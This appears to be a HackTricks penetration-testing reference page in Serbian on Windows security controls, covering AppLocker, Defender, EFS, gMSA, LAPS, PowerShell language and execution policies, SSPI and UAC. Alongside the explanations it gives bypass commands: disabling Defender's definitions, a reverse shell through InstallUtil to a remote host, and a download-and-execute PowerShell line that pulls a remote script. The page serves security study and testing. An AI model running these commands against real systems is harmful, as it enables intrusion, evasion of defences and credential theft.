# Windows Security Controls

{{#include ../banners/hacktricks-training.md}}

## AppLocker Policy

Lista dozvoljenih aplikacija je spisak odobrenih softverskih aplikacija ili izvršnih datoteka kojima je dozvoljeno da budu prisutne i da se pokreću na sistemu. Cilj je zaštititi okruženje od štetnog malware-a i neodobrenog softvera koji nije u skladu sa specifičnim poslovnim potrebama organizacije.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) je Microsoft-ovo **rešenje za listu dozvoljenih aplikacija** i administratorima sistema pruža kontrolu nad tim **koje aplikacije i datoteke korisnici mogu da pokreću**. Omogućava **granularnu kontrolu** nad izvršnim datotekama, skriptama, Windows installer datotekama, DLL datotekama, paketiranim aplikacijama i installer-ima paketiranih aplikacija.\
Uobičajeno je da organizacije **blokiraju cmd.exe i PowerShell.exe** i pristup za upis u određene direktorijume, **ali sve ovo može da se zaobiđe**.

### Provera

Proverite koje datoteke/ekstenzije su na blacklisti/whitelisti:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
`Test-AppLockerPolicy` procenjuje kandidate za fajlove za određeni identitet u odnosu na AppLocker politiku. Testirajte nalog čiji će token izvršiti payload, jer pravila mogu ciljati korisnike ili grupe; `Get-AppLockerFileInformation` je takođe koristan za pregled putanje, hash-a i metapodataka izdavača na osnovu kojih pravila mogu da se podudare.<sup>[[5]](#references)</sup>
```powershell
$policy = Get-AppLockerPolicy -Effective
$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
Test-AppLockerPolicy -PolicyObject $policy -Path C:\Users\Public\payload.exe -User $user
Get-AppLockerFileInformation -Path C:\Users\Public\payload.exe | Format-List
```
Ova putanja registra sadrži konfiguracije i politike koje primenjuje AppLocker, što omogućava pregled trenutnog skupa pravila nametnutih na sistemu:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- Korisni **Writable folders** za zaobilaženje AppLocker Policy: Ako AppLocker dozvoljava izvršavanje bilo čega unutar `C:\Windows\System32` ili `C:\Windows`, postoje **writable folders** koje možete koristiti za **bypass** ovoga.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Uobičajeno **trusted** [**"LOLBAS's"**](https://lolbas-project.github.io/) binarne datoteke takođe mogu biti korisne za zaobilaženje AppLocker-a.
- **Loše napisanim pravilima takođe se može zaobići zaštita**
- Na primer, kod pravila **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, možete kreirati **folder pod nazivom `allowed`** bilo gde i on će biti dozvoljen.
- Organizacije se takođe često fokusiraju na **blokiranje izvršne datoteke `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, ali zaboravljaju na **druge** [**lokacije PowerShell izvršnih datoteka**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations), kao što su `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` ili `PowerShell_ISE.exe`.
- **Primena pravila za DLL veoma se retko omogućava** zbog dodatnog opterećenja koje može izazvati na sistemu i količine testiranja potrebne da bi se osiguralo da se ništa neće pokvariti. Zato će korišćenje **DLL-ova kao backdoor-a pomoći u zaobilaženju AppLocker-a**.
- Možete koristiti [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ili [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) za **izvršavanje Powershell** koda u bilo kom procesu i zaobilaženje AppLocker-a. Za više informacija pogledajte: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Credentials Storage

### Security Accounts Manager (SAM)

Lokalni credential-i se nalaze u ovoj datoteci, a lozinke su hash-ovane.

### Local Security Authority (LSA) - LSASS

**Credential-i** (hash-ovani) se **čuvaju** u **memoriji** ovog podsistema zbog Single Sign-On razloga.\
**LSA** administrira lokalnu **security policy** (politiku lozinki, dozvole korisnika...), **authentication**, **access token-e**...\
LSA će biti taj koji će **proveriti** prosleđene credential-e u datoteci **SAM** (za lokalni login) i **komunicirati** sa **domain controller-om** radi autentifikacije domain korisnika.

**Credential-i** se **čuvaju** unutar **LSASS procesa**: Kerberos ticket-i, NT i LM hash-evi, lako dešifrujuće lozinke.

### LSA secrets

LSA može sačuvati neke credential-e na disku:

- Lozinku naloga računara u Active Directory-ju (nedostupan domain controller).
- Lozinke naloga Windows servisa
- Lozinke za scheduled task-ove
- Još toga (lozinka IIS aplikacija...)

### NTDS.dit

To je baza podataka Active Directory-ja. Prisustvuje samo na Domain Controller-ima.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) je Antivirus koji je dostupan u Windows 10 i Windows 11, kao i u verzijama Windows Server-a. On **blokira** uobičajene pentesting alate kao što je **`WinPEAS`**. Međutim, postoje načini da se **zaobiđu ove zaštite**.

### Check

Da biste proverili **status** alata **Defender**, možete izvršiti PS cmdlet **`Get-MpComputerStatus`** (proverite vrednost **`RealTimeProtectionEnabled`** da biste saznali da li je aktivan):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Da biste ga enumerisali, možete takođe pokrenuti:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Šifrovani sistem datoteka (EFS)

EFS štiti datoteke pomoću enkripcije, koristeći **simetrični ključ** poznat kao **ključ za enkripciju datoteke (FEK)**. Ovaj ključ se enkriptuje korisnikovim **javnim ključem** i čuva u **alternativnom toku podataka** $EFS šifrovane datoteke. Kada je potrebna dekripcija, odgovarajući **privatni ključ** korisnikovog digitalnog sertifikata koristi se za dešifrovanje FEK-a iz $EFS toka. Više detalja možete pronaći [ovde](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Scenario dekripcije bez inicijacije korisnika** uključuje:

- Kada se datoteke ili fascikle premeste na sistem datoteka koji ne koristi EFS, kao što je [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), automatski se dešifruju.
- Šifrovane datoteke poslate preko mreže putem SMB/CIFS protokola dešifruju se pre prenosa.

Ovaj metod enkripcije omogućava vlasniku **transparentan pristup** šifrovanim datotekama. Međutim, samo promena lozinke vlasnika i prijavljivanje neće omogućiti dekripciju.

**Ključne napomene**:

- EFS koristi simetrični FEK, šifrovan korisnikovim javnim ključem.
- Dekripcija koristi korisnikov privatni ključ za pristup FEK-u.
- Automatska dekripcija se dešava pod određenim uslovima, kao što su kopiranje na FAT32 ili mrežni prenos.
- Vlasnik može pristupiti šifrovanim datotekama bez dodatnih koraka.

### Provera EFS informacija

Proverite da li je **user** **koristio** ovaj **service** tako što ćete proveriti da li ova putanja postoji:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Proverite **ko** ima **pristup** datoteci pomoću cipher /c \<file>\
Takođe možete koristiti `cipher /e` i `cipher /d` unutar fascikle da biste **enkriptovali** i **dekriptovali** sve datoteke

### Dekripcija EFS datoteka

#### Biti Authority System

Ovaj pristup zahteva da **victim user** ima **pokrenut** **proces** na hostu. Ako je to slučaj, iz `meterpreter` sesije možete impersonate korisnikov token procesa (`impersonate_token` iz `incognito`). Druga mogućnost je da uradite `migrate` u korisnikov proces.

#### Poznavanje korisnikove lozinke

Mimikatz može da uveze korisnikov sertifikat i privatni ključ, a zatim da ih upotrebi za dešifrovanje EFS-zaštićenih datoteka.<sup>[[2]](#references)</sup>

{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Grupno upravljani servisni nalozi (gMSA)

Microsoft je razvio **Group Managed Service Accounts (gMSA)** radi pojednostavljivanja upravljanja servisnim nalozima u IT infrastrukturama. Za razliku od tradicionalnih servisnih naloga, kod kojih je često omogućena postavka "**Password never expire**", gMSA nude bezbednije rešenje kojim se lakše upravlja:

- **Automatsko upravljanje lozinkom**: gMSA koriste složenu lozinku od 240 karaktera koja se automatski menja u skladu sa pravilima domena ili računara. Ovim procesom upravlja Microsoft-ov Key Distribution Service (KDC), čime se eliminiše potreba za ručnim ažuriranjem lozinki.
- **Poboljšana bezbednost**: Ovi nalozi nisu podložni zaključavanju i ne mogu se koristiti za interaktivno prijavljivanje, čime se poboljšava njihova bezbednost.
- **Podrška za više hostova**: gMSA se mogu deliti između više hostova, što ih čini idealnim za servise koji rade na više servera.
- **Mogućnost pokretanja zakazanih zadataka**: Za razliku od managed service accounts, gMSA podržavaju pokretanje zakazanih zadataka.
- **Pojednostavljeno upravljanje SPN-om**: Sistem automatski ažurira Service Principal Name (SPN) kada dođe do promena sAMaccount detalja ili DNS imena računara, čime se pojednostavljuje upravljanje SPN-om.

Lozinke za gMSA čuvaju se u LDAP svojstvu _**msDS-ManagedPassword**_ i Domain Controllers (DCs) ih automatski resetuju svakih 30 dana. Ova lozinka, šifrovani blob podataka poznat kao [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), može se preuzeti samo od strane ovlašćenih administratora i servera na kojima su gMSA instalirani, čime se obezbeđuje sigurno okruženje. Za pristup ovim informacijama potrebna je zaštićena veza, kao što je LDAPS, ili veza mora biti autentifikovana pomoću opcije 'Sealing & Secure'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../images/asd1.png)<sup>[[3]](#references)</sup>

Ovu lozinku možete pročitati pomoću [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**Pronađite više informacija u ovoj objavi**](https://cube0x0.github.io/Relaying-for-gMSA/)<sup>[[3]](#references)</sup>

Takođe pogledajte ovu [web stranicu](https://cube0x0.github.io/Relaying-for-gMSA/) o tome kako izvršiti **NTLM relay attack** za **čitanje** **password-a** za **gMSA**.<sup>[[3]](#references)</sup>

## LAPS

Tokom enumeracije razlikujte **legacy Microsoft LAPS** od izvorne **Windows LAPS** implementacije. Windows LAPS je isporučen u Windows ažuriranjima od 11. aprila 2023. i može da sačuva password upravljanog lokalnog administratora u **Windows Server Active Directory** ili **Microsoft Entra ID**. U implementacijama zasnovanim na AD-u može dodatno da šifruje password-e, čuva istoriju šifrovanih password-a i upravlja DSRM password-om kontrolera domena. Legacy MSI koji se može preuzeti je zastareo na novijim verzijama Windows-a, iako Windows LAPS može da radi u režimu emulacije legacy verzije.<sup>[[6]](#references)</sup>

Pošto su legacy Microsoft LAPS i Windows LAPS odvojene implementacije, utvrdite koja je implementacija postavljena pre primene napada specifičnih za atribute ili cmdlet-e. Povezana stranica obuhvata otkrivanje, enumeraciju ACL-ova, preuzimanje, manipulisanje istekom i offline oporavak, bez ponavljanja tih procedura ovde.<sup>[[6]](#references)</sup>

{{#ref}}
active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **ograničava mnoge funkcije** potrebne za efikasno korišćenje PowerShell-a, kao što su blokiranje COM objekata, dozvoljavanje samo odobrenih .NET tipova, workflow-i zasnovani na XAML-u, PowerShell klase i drugo.

### **Provera**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
U aktuelnim verzijama Windows-a taj Bypass neće raditi, ali možete koristiti [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Za kompajliranje možda ćete morati** **da** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> dodate `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` i **promenite projekat na .Net4.5**.

#### Direktni bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Možete koristiti [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ili [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) da **izvršite Powershell** kod u bilo kom procesu i zaobiđete constrained mode. Za više informacija pogledajte: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## PS politika izvršavanja

Podrazumevano je podešena na **restricted.** Glavni načini za zaobilaženje ove politike:<sup>[[4]](#references)</sup>
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Više informacija možete pronaći [ovde](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[4]](#references)</sup>

## Security Support Provider Interface (SSPI)

To je API koji se može koristiti za autentifikaciju korisnika.

SSPI je zadužen za pronalaženje odgovarajućeg protokola za dve mašine koje žele da komuniciraju. Preferirani metod za ovo je Kerberos. Zatim SSPI pregovara o tome koji će se authentication protocol koristiti; ovi authentication protocols se nazivaju Security Support Provider (SSP), nalaze se unutar svake Windows mašine u obliku DLL-a i obe mašine moraju da podržavaju isti protokol da bi mogle da komuniciraju.

### Glavni SSP-ovi

- **Kerberos**: Preferirani
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** i **NTLMv2**: Iz razloga kompatibilnosti
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Web serveri i LDAP, password u obliku MD5 hash-a
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL i TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Koristi se za pregovaranje o protokolu koji će se koristiti (Kerberos ili NTLM, pri čemu je Kerberos podrazumevani)
- %windir%\Windows\System32\lsasrv.dll

#### Pregovaranje može ponuditi nekoliko metoda ili samo jednu.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) je funkcija koja omogućava **prompt za pristanak za aktivnosti sa povišenim privilegijama**.

{{#ref}}
authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}



## References

- [1] [Zaobilaženje AppLocker-a i PowerShell constrained language mode-a](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [2] [kako ~ dešifrovati EFS fajlove](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [3] [Relaying za gMSA](https://cube0x0.github.io/Relaying-for-gMSA/)
- [4] [15 načina za zaobilaženje PowerShell Execution Policy-ja](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [5] [Korišćenje AppLocker Windows PowerShell cmdlet-a](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/use-the-applocker-windows-powershell-cmdlets)
- [6] [Pregled Windows LAPS-a](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview)
{{#include ../banners/hacktricks-training.md}}
